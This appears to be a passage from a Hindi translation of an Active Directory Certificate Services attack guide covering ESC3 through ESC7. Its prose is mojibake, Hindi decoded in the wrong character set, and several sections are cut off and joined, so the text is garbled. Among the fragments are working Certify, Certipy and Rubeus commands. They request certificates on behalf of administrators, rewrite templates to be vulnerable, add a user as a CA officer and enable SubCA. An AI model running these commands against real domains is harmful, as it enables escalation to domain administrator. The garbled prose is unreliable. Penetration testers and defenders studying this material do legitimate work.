- рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛ рдЫреВрдЯ рджреА рдЧрдИ рд╣реИред
- рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред
- рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
- рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдПрдЬреЗрдВрдЯ EKU рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рдЕрдиреНрдп рдкреНрд░рдзрд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

**рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ 2:**

- рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рд╕реАрдП рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
- рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рд╕реНрдХреАрдорд╛ рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ 1 рд╣реИ рдпрд╛ 2 рд╕реЗ рдЕрдзрд┐рдХ рд╣реИ, рдФрд░ рдпрд╣ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреЙрд▓рд┐рд╕реА рдЗрд╢реНрдпреВрдЕрдВрд╕ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдПрдЬреЗрдВрдЯ EKU рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
- рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдПрдХ EKU рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
- рд╕реАрдП рдкрд░ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдмрдВрдз рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИрдВред

### рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**Certify**](https://github.com/GhostPack/Certify) рдпрд╛ [**Certipy**](https://github.com/ly4k/Certipy) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЬрд┐рдиреНрд╣реЗрдВ **рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рдЙрди рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдореЗрдВ рдЬрд┐рдирдореЗрдВ рдПрдирд░реЛрд▓рдореЗрдВрдЯ **рдПрдЬреЗрдВрдЯреНрд╕** рдХреЛ рдПрдирд░реЛрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рдФрд░ рдЬрд┐рдирдХреЗ рд▓рд┐рдП рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЙрдиреНрд╣реЗрдВ рдЙрджреНрдпрдо CA рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ `certsrc.msc` **рд╕реНрдиреИрдк-рдЗрди** рдЦреЛрд▓рдХрд░, CA рдкрд░ **рджрд╛рдпрд╛рдБ рдХреНрд▓рд┐рдХ** рдХрд░рдХреЗ, **рд╕рдВрдкрддреНрддрд┐** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ, рдФрд░ рдлрд┐рд░ тАЬрдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕тАЭ рдЯреИрдм рдкрд░ **рдиреЗрд╡рд┐рдЧреЗрдЯ** рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдиреЛрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ CA рдХреЗ рд▓рд┐рдП **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд╕реЗрдЯрд┐рдВрдЧ тАЬ**рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рди рдХрд░реЗрдВ**тАЭ рд╣реИред рдЬрдм рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ тАЬрдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░реЗрдВтАЭ рдкрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡рд┐рдиреНрдпрд╛рд╕ рдЕрддреНрдпрдВрдд рдЕрдиреБрдореЛрджрдирд╢реАрд▓ рд░рд╣рддрд╛ рд╣реИред рдпрд╣ рд╕рднреА рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╡реНрдпрдХреНрддрд┐ рдХреЗ рд░реВрдк рдореЗрдВ **рд╕рднреА рдХреЛ** рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** рдПрдХ рдПрдХрд▓ рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ, Certipy рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ **ESC1 рдХреЗ рд▓рд┐рдП рд╡рдВрд╢рд╛рд╡рдзрд┐** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдЧрд╛ред рд╣рдо **рдкреБрд░рд╛рдиреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд╕рд╣реЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП `-save-old` рдкреИрд░рд╛рдореАрдЯрд░** рднреА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рд╣рдорд╛рд░реЗ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рдж рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ **рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛ред
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## рд╡рдВрд▓рд░реЗрдмрд▓ рдкреАрдХреЗрдЖрдИ рдСрдмреНрдЬреЗрдХреНрдЯ рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ - ESC5

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдЬреЛ рд╡реНрдпрд╛рдкрдХ рд╡реЗрдм рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд ACL рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдмрдВрдз рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдФрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рд╕реЗ рдЕрдзрд┐рдХ рдХрдИ рдСрдмреНрдЬ
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
рдпрд╣ рдСрдкрд░реЗрд╢рди рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **рджреВрд░рд╕реНрде рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдПрдХреНрд╕реЗрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools рдЬреИрд╕реЗ [**Certify**](https://github.com/GhostPack/Certify) рдФрд░ [**Certipy**](https://github.com/ly4k/Certipy) рдЗрд╕ рдЧрд▓рдд рд╡рд┐рдиреНрдпрд╛рд╕ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
рдЗрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдорд╛рдирддреЗ рд╣реБрдП рдХрд┐ рдХрд┐рд╕реА рдХреЗ рдкрд╛рд╕ **рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ** рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ рдпрд╛ рд╕рдордХрдХреНрд╖, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рдХрд┐рд╕реА рднреА рдХрд╛рд░реНрдпрд╕реНрдерд▓ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
рдХрд┐рд╕реА рднреА рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдзреНрд╡рдЬ рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
рдордИ 2022 рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдб
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
рдпрд╣ рдореБрдЦреНрдп рдЕрдзрд┐рдХрд╛рд░реЛрдВ, рдЕрд░реНрдерд╛рдд **`ManageCA`** рдФрд░ **`ManageCertificates`**, рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрд╡рд▓реЛрдХрди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ "CA рдкреНрд░рд╢рд╛рд╕рдХ" рдФрд░ "рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рдмрдВрдзрдХ" рдХреА рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рд╣реИрдВред

#### рджреБрд░реБрдкрдпреЛрдЧ

рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкрд░ **`ManageCA`** рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рд╕реЗ рд╕рд┐рджреНрдзрд╛рдВрддрд▓рдЧрд╛рддрд╛ рдХреЛ PSPKI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреВрд░рд╕реНрде рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдЗрд╕рдореЗрдВ **`EDITF_ATTRIBUTESUBJECTALTNAME2`** рдзреНрд╡рдЬ рдХреЛ рдЯреЙрдЧрд▓ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рддрд╛рдХрд┐ рдХрд┐рд╕реА рднреА рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ SAN рд╡рд┐рд╢рд┐рд╖реНрдЯреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ, рдЬреЛ рдбреЛрдореЗрди рдЙрдиреНрдирддрд┐ рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╣рд▓реВ рд╣реИред

рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рд░рд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП PSPKI рдХреЗ **Enable-PolicyModuleFlag** cmdlet рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕реАрдзреЗ GUI рдмрд╛рддрдЪреАрдд рдХреЗ рдмрд┐рдирд╛ рд╕рдВрд╢реЛрдзрди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

**`ManageCertificates`** рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╕реЗ рд▓рдВрдмрд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдордВрдЬреВрд░реА рджреЗрдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ "CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рдмрдВрдзрдХ рдордВрдЬреВрд░реА" рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред

**Certify** рдФрд░ **PSPKI** рдореЙрдбреНрдпреВрд▓реЛрдВ рдХрд╛ рд╕рдВрдпреЛрдЬрди рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ, рдордВрдЬреВрд░реА рджреЗрдиреЗ, рдФрд░ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### рд╣рдорд▓рд╛ 2

#### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

{% hint style="warning" %}
**рдкрд┐рдЫрд▓реЗ рд╣рдорд▓реЗ** рдореЗрдВ **`Manage CA`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддрд╛рдХрд┐ **EDITF\_ATTRIBUTESUBJECTALTNAME2** рдзреНрд╡рдЬ рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬрд┐рд╕рд╕реЗ **ESC6 рд╣рдорд▓рд╛** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд▓реЗрдХрд┐рди рдпрд╣ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рдбрд╛рд▓реЗрдЧрд╛ рдЬрдм рддрдХ CA рд╕реЗрд╡рд╛ (`CertSvc`) рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ред рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ `Manage CA` рдПрдХреНрд╕реЗрд╕ рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреА рднреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдпрд╣ рдирд╣реАрдВ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗрд╡рд╛ рдХреЛ рджреВрд░рд╕реНрде рд╕реЗ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЕрдзрд┐рдХрд╛рдВрд╢ рдкреИрдЪ рдХрд┐рдП рдЧрдП рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рдордИ 2022 рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ рдХреЗ рдХрд╛рд░рдг **ESC6** рдЕрдзрд┐рдХрд╛рдВрд╢ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

рдЗрд╕рд▓рд┐рдП, рдпрд╣рд╛рдВ рдПрдХ рдФрд░ рд╣рдорд▓рд╛ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред

рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ:

* рдХреЗрд╡рд▓ **`ManageCA` рдЕрдиреБрдорддрд┐**
* **`Manage Certificates`** рдЕрдиреБрдорддрд┐ (рдЗрд╕реЗ **`ManageCA`** рд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ **`SubCA`** рдХреЛ **рд╕рдХреНрд░рд┐рдп** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЗрд╕реЗ **`ManageCA`** рд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)

рдпрд╣ рддрдХрдиреАрдХ рдЙрд╕ рддрдереНрдп рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ `Manage CA` _рдФрд░_ `Manage Certificates` рдПрдХреНрд╕реЗрд╕ рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ, рд╡реЗ **рд╡рд┐рдлрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЕрдиреБрд░реЛрдз** рдЬрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **`SubCA`** рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ **ESC1 рдХреЗ рд▓рд┐рдП рд╡рдВрд╢рд╛рд╡рд╢** рд╣реИ, рд▓реЗрдХрд┐рди **рдХреЗрд╡рд▓ рдкреНрд░рд╢рд╛рд╕рдХ** рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** **`SubCA`** рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛрдиреЗ рдХрд╛ **рдЕрдиреБрд░реЛрдз** рдХрд░ рд╕рдХрддрд╛ рд╣реИ - рдЬрд┐рд╕реЗ **рдЗрдирдХрд╛рд░** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ - рд▓реЗрдХрд┐рди **рдлрд┐рд░ рдкреНрд░рдмрдВрдзрдХ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

#### рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк рдЕрдкрдиреЗ рдЖрдк рдХреЛ **`Manage Certificates`** рдПрдХреНрд╕реЗрд╕ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдирдП рдЕрдзрд┐рдХрд╛рд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рдХрд░ред
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ `-enable-template` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде CA рдкрд░ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, `SubCA` рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕рдХреНрд░рд┐рдп рд╣реЛрддрд╛ рд╣реИред
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
рдпрджрд┐ рд╣рдо рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдВ рдкреВрд░реА рдХрд░ рдЪреБрдХреЗ рд╣реИрдВ, рддреЛ рд╣рдо **`SubCA` рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

**рдпрд╣ рдЕрдиреБрд░реЛрдз рдЕрд╕реНрд╡реАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**, рд▓реЗрдХрд┐рди рд╣рдо рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рд╕рд╣реЗрдЬреЗрдВрдЧреЗ рдФрд░ рдЕрдиреБрд░реЛрдз рдЖрдИрдбреА рдиреЛрдЯ рдХрд░реЗрдВрдЧреЗред
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
